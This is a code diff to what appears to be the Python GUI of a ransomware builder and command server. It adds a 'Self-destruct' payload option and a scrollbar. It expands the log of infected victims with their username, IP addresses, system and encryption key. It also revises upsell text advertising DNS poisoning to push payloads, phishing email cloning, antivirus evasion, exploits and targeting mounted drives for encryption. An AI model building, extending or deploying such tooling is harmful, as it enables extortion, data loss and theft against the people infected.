@@ -171,6 +171,7 @@ class MainWindow(Tk):
             'ext' : StringVar(),
             'target_ext' : StringVar(),
             'new_target_ext' : StringVar(),
+            'remove_payload' : IntVar(),
 
         }
 
@@ -462,6 +463,10 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         self.serv.options['log'] = Text(result, foreground="white", background="black", highlightcolor="white", highlightbackground="black", height = 35, width = 120)
         self.serv.options['log'].grid(row = 0, column = 1)
 
+        scroll = Scrollbar(self.serv, command=self.serv.options['log'].yview)
+        scroll.grid(row=1, column=5, sticky='nsew')
+        self.serv.options['log']['yscrollcommand'] = scroll.set
+
         # Tags
         self.serv.options['log'].tag_configure('yellow', foreground='yellow')
         self.serv.options['log'].tag_configure('red', foreground='red')
@@ -469,9 +474,6 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         self.serv.options['log'].tag_configure('orange', foreground='orange')
         self.serv.options['log'].tag_configure('green', foreground='green')
         self.serv.options['log'].tag_configure('bold', font='bold')
-
-        header = 'Occured'.ljust(20), 'Remote'.ljust(20), 'Local'.ljust(20), 'Platform'.ljust(20), 'key'
-        self.serv.options['log'].insert('1.0', '{0[0]} {0[1]} {0[2]} {0[3]} {0[4]}'.format(header), 'green')
 
         self.start_thread()
 
@@ -581,8 +583,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
         options_frame = LabelFrame(self.gen, text = 'Options')
         options_frame.grid(row = 0, column = 3, sticky = 'w')
-        Checkbutton(options_frame, text = 'Demo', variable = self.options['demo'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 0)
-        Checkbutton(options_frame, text = 'Debug', variable = self.options['debug'], onvalue = 1, offvalue = 0).grid(row = 1, column = 0)
+        Checkbutton(options_frame, text = 'Demo', variable = self.options['demo'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 0, sticky = 'w')
+        Checkbutton(options_frame, text = 'Debug', variable = self.options['debug'], onvalue = 1, offvalue = 0).grid(row = 1, column = 0, sticky = 'w')
+        Checkbutton(options_frame, text = 'Self-destruct', variable = self.options['remove_payload'], onvalue = 1, offvalue = 0).grid(row = 2, column = 0, sticky = 'w')
 
         content_frame = LabelFrame(self.gen, text = 'Content')
         content_frame.grid(row = 1, column = 0, sticky = 'w')
@@ -667,7 +670,8 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                 self.options['img_base64'].get(),
                 self.options['mode'].get(),
                 self.options['debug'].get(),
-                self.options['target_ext'].get())
+                self.options['target_ext'].get(),
+                self.options['remove_payload'].get())
             messagebox.showinfo('SUCCESS', 'Payload successfully generated!\n\nFile saved to ./payload.py')
             self.gen.destroy()
         except Exception as e:
@@ -772,8 +776,19 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                                 local = data.split('$')[0]
                                 system = data.split('$')[1]
                                 key = data.split('$')[2].strip()[2:].strip()[:-1]
+                                user = data.split('$')[3]
 
-                                self.serv.options['log'].insert(END, '\n[%s %s] %s %s %s %s' % (time.strftime('%d/%m/%Y'), time.strftime('%X'), ip.ljust(20), local.ljust(20), system.ljust(20), key), 'yellow')
+                                result = '''
+[Occured]    -> %s %s
+[USERNAME]   -> %s
+[REMOTE IP]  -> %s
+[LOCAL IP]   -> %s
+[SYSTEM]     -> %s
+[KEY]        -> %s
+
+''' % (time.strftime('%d/%m/%Y'), time.strftime('%X'), user, ip, local, system, key)
+
+                                self.serv.options['log'].insert(END, result, 'yellow')
                                 self.serv.options['log'].see(END)
 
                             else:
@@ -880,9 +895,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 + Unlock: More payload customization
     Unlock further payload customization such as a custom file
     extention for encrypted files and put a header in encrypted files
-    with your hacker name or payload name.
+    with your hacker or payload name.
 
-+ Unlock: MITM + DNS Poisoning
++ Unlock: MITM + DNS Poisoning (Note: experimental)
     Add DNS Poisoning to your payload so when your victim executes your payload
     the DNS is being modified, allowing you to redirect websites to other websites,
     for example; google.com redirects to DownloadYourPayload.com. This allows
@@ -896,7 +911,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
     to send your payload with.
 
 + Unlock: Email Cloning
-    Select a custumizable Email template to use for your Email.
+    Select a customizable Email template to use for your Email.
 
 + Unlock: FUD
     Make your payload Fully Undetectable by any anti-virus
@@ -915,6 +930,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
 + Unlock: Exploits
     Select a exploit from a list to improve your payload delivery methods.
+
++ Unlock: Drive detection
+    Detect mounted drives and target them for encryption
 
 + Unlock: PRO updates & more to come
     Not all updates are FREE, some updates are for PRO users only.
